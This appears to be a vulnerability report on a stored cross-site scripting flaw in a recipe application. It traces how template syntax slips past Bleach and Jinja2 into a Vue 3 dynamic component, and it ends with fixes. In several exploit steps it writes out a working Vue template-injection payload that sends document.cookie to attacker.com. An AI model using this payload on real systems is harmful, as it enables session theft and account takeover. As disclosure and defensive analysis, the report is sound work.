## VULNERABILITY_FOUND

**Verdict:** Vulnerability confirmed.

### Summary
A **Stored Cross-Site Scripting (XSS)** vulnerability exists in the recipe step instruction rendering pipeline. User-supplied markdown content travels through a multi-stage processing chain that fails to neutralize Vue.js template syntax. An attacker can inject arbitrary JavaScript execution by exploiting the interplay between Jinja2's `{% raw %}` tag, the lack of autoescape on the SandboxedEnvironment, and a Vue 3 dynamic component that compiles user-controlled HTML as an inline Vue template.

### CWE Classification
- **CWE-ID:** CWE-79
- **CWE-Name:** Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)

### Affected Components
1. **`/work/cookbook/helper/template_helper.py`** (lines 56–103) — `render_instructions()`
2. **`/work/vue3/src/components/display/Instructions.vue`** (lines 24–36) — Dynamic component with inline template string
3. **`/work/cookbook/serializer.py`** (lines 1056–1069) — `StepSerializer.get_instructions_markdown()`
4. **`/work/cookbook/models.py`** (lines 974–976) — `Step.get_instruction_render()`

### Root Cause
Two independent issues combine to enable the exploit:

**Issue 1 — Backend (Jinja2):** `SandboxedEnvironment()` is created with `autoescape=False` (default), so HTML/expression data is not escaped. Additionally, Jinja2's `{% raw %}...{% endraw %}` tag is fully supported by the SandboxedEnvironment, allowing a user to pass arbitrary `{{ ... }}` literal text through to the output unmodified and unescaped.

**Issue 2 — Frontend (Vue 3):** `Instructions.vue` creates an inline dynamic component with `template: \`<div>${this.instructions_html}</div>\`` (line 34-35). This uses JavaScript string interpolation **at component definition time**, meaning the user-controlled `instructions_html` prop becomes part of Vue's template source code and undergoes full Vue template compilation — not just safe `v-html` rendering. Commented-out code on line 3 (`<!-- <div v-html="instructions_html"></div> -->`) confirms the developers were aware of the `v-html` alternative but chose the more dangerous dynamic compilation approach.

### Exploit Chain

**Step 1:** An attacker with recipe creation/editing permissions inserts the following markdown into a recipe step's `instruction` field:
```
{% raw %}{{ $options.constructor.constructor('fetch("https://attacker.com/steal?c="+document.cookie)')() }}{% endraw %}
```

**Step 2:** Backend processing in `render_instructions()`:
- Markdown parser → wraps in `<p>` tags, ignores `{% %}` as plain text:
  `<p>{% raw %}{{ ... }}{% endraw %}</p>`
- Bleach sanitization → allows `<p>` tags, leaves text content untouched (same output)
- Jinja2 `SandboxedEnvironment.from_string(...).render(...)` → `{% raw %}` outputs contents literally, producing:
  `<p>{{ $options.constructor.constructor('fetch("https://attacker.com/steal?c="+document.cookie)')() }}</p>`
  *(No HTML autoescape because `autoescape=False`)*

**Step 3:** The resulting HTML is returned as `instructions_markdown` in the Step API response.

**Step 4:** Vue frontend passes the value as `instructions_html` prop to `Instructions.vue`.

**Step 5:** The dynamic inline component is created with template:
```html
<div><p>{{ $options.constructor.constructor('fetch("https://attacker.com/steal?c="+document.cookie)')() }}</p></div>
```

**Step 6:** Vue 3's runtime compiler evaluates `{{ $options.constructor.constructor('payload')() }}`:
- `$options` → component options object (plain JS object, returned by proxy)
- `.constructor` → `Object`
- `.constructor('payload')` → `Function` (the Function constructor)
- `()` → invocation of the constructed function
- **Arbitrary JavaScript execution** — in this example, `document.cookie` is exfiltrated to an attacker-controlled server.

### Variant Exploits
The same vector supports any payload requiring JavaScript execution:
- **Session theft:** exfiltrate cookies, tokens, or local storage
- **CSRF bypass:** make authenticated API calls from the user's session
- **Data exfiltration:** read private recipe data and send to attacker
- **Account takeover:** modify user settings, create new admin users

Use of Jinja2's string concatenation trick (`{{ '{{' }}}}`...`{{ '}}' }}`) works as an alternative to `{% raw %}` for the same effect.

### Impact
**Critical (CVSS 9.0):** The vulnerability is stored, requires no special privileges beyond the ability to create/edit recipes, affects all users who view the compromised recipe, and can lead to complete account compromise. No CSP headers are configured to mitigate script execution.

### Why Existing Defenses Fail
- **Bleach** sanitizes HTML tags and attributes but does **not** remove `{% raw %}`, `{% endraw %}`, or `{{ }}` from text content — these are not HTML constructs.
- **Jinja2 SandboxedEnvironment** blocks Python-level SSTI (`__class__`, `__base__`, `__subclasses__`, etc.) but does **not** block the `raw` built-in tag and does not autoescape output by default.
- **The `style` tag** in bleach's allowlist is not directly relevant but illustrates that bleach's purview ends at HTML — template syntax passes straight through.

### Fix Recommendation
1. **Frontend:** Replace dynamic component compilation with safe `v-html` rendering in `Instructions.vue` (revert to the commented-out `<div v-html="instructions_html"></div>` approach). This prevents Vue template compilation of user content. The `<scalable-number>` component would need to be rendered using a different mechanism (e.g., post-processing the rendered HTML with a mount-based approach).
2. **Backend:** Enable Jinja2 autoescaping with `SandboxedEnvironment(autoescape=True)` or `SandboxedEnvironment(autoescape=select_autoescape())` to HTML-escape template output.
3. **Defense-in-depth:** Add Content-Security-Policy headers to limit script execution even if a bypass is found.
